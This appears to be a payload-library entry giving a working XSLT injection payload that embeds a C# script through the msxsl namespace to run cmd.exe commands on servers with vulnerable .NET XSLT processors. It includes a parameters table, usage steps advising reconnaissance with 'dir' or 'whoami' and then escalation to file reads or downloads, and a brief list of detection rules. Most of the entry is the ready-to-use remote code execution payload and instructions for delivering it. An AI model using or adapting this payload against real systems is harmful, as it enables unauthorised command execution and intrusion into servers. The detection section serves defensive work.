---
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:41.519856+00:00'
updated_at: '2023-04-10T20:24:50.765436+00:00'
tags:
  - XSLT Injection
  - RCE Payload
  - Embedded C# Script
platforms:
  - Windows
validated: true
---

# XSLT-with-Embedded-C-Sharp-Script-to-Execute-Dir-Command

## Code

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="urn:my-scripts">

<msxsl:script language = "C#" implements-prefix = "user">
<![CDATA[
public string execute(){
System.Diagnostics.Process proc = new System.Diagnostics.Process();
proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
proc.StartInfo.RedirectStandardOutput = true;
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.Arguments = "/c dir";
proc.Start();
proc.WaitForExit();
return proc.StandardOutput.ReadToEnd();
}
]]>
</msxsl:script>

<xsl:template match="/fruits">
List Directory Contents:
<xsl:value-of select="user:execute()"/>
</xsl:template>
</xsl:stylesheet>
```

## Description

This XSLT stylesheet injects an embedded C# script using the msxsl namespace to execute the Windows 'dir' command via cmd.exe. When processed by a vulnerable .NET XSLT transformer, it spawns a process to list the current directory contents and returns the output in the transformation result. The template matches on '/fruits' (customize as needed for the target XML), making it suitable for injection into XML inputs processed by web applications.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Arguments in proc.StartInfo | The command-line arguments for cmd.exe (modify within the CDATA block) | "/c dir" (lists directory); "/c whoami" (shows current user) |
| FileName in proc.StartInfo | Path to the command interpreter (Windows-specific) | "C:\\windows\\system32\\cmd.exe" |
| match in xsl:template | XPath selector to trigger the script (align with target XML structure) | "/fruits" (example; change to match input root) |

## Usage

Embed this XSLT as the payload in an XML request to a vulnerable transformation endpoint (e.g., POST to /api/transform with the XML body). The server must use a .NET XSLT processor that allows msxsl:script. Start with reconnaissance commands like 'dir' or 'whoami', then escalate to file reads or downloads. Deliver via Burp Suite or similar for testing.

## Detection

- Monitor XML/XSLT inputs for msxsl namespace or CDATA blocks containing C# keywords like System.Diagnostics.Process.
- Enable .NET logging for XSLT compilation errors or script execution.
- WAF rules to block requests with <msxsl:script> tags or anomalous process spawns from web contexts (e.g., via ETW or Sysmon).
- Application logs showing cmd.exe executions from IIS worker processes.

## Related

- [[procedures/XSLT-Injection-with-Embedded-C-Sharp-Script-for-RCE]]
